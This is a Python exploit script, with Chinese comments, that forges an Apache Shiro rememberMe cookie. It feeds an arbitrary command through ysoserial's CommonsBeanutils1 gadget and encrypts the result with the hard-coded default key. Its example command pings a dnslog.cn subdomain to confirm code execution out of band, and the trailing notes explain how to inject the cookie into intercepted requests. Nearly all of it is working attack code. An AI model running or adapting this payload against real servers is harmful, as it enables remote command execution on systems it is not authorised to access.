# pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES
import binascii

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    # print(type(popen)) #<class 'subprocess.Popen'>
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA==" # 常量
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes # 随机值
    # print(iv)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())  
    # print(type(file_body)) # <class 'bytes'>
    # print(file_body)
    x = binascii.hexlify(file_body)
    java_hex = str(x,'ascii')
    #print("java_hex:\n",java_hex,"\n")
    # java_str = str(file_body, encoding = "latin-1")

    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    # print(base64_ciphertext)
    print("base64_ciphertext的type:",type(base64_ciphertext))
    base64_ciphertext_str = (str(base64_ciphertext, encoding = "utf-8"))
    return base64_ciphertext

def printpayload(command):
    rememberMe = encode_rememberme(command)
    #print("payload is :\nrememberMe=%s"%rememberMe)# 直接输出输出有b''
    print("payload is :\nrememberMe=%s"%str(rememberMe, encoding = "utf-8"))# bytes to str,输出没有b''

if __name__ == '__main__':
    printpayload(command="ping f4qe0k.dnslog.cn")

'''
1、访问http://dnslog.cn/
2、点击页面上的Get SubDomain就会给你分配一个随机的域名
3、点击页面上的Refresh Record就会刷新查询记录
4、在目标机器上运行"ping 你的随机域名"，这个网站点击Refresh Record就能看到记录

利用的办法就是使用截包工具来修改数据包在cookie里面加一个“rememberMe=XXXXX”，注意别忘了各个cookie之间的";"
'''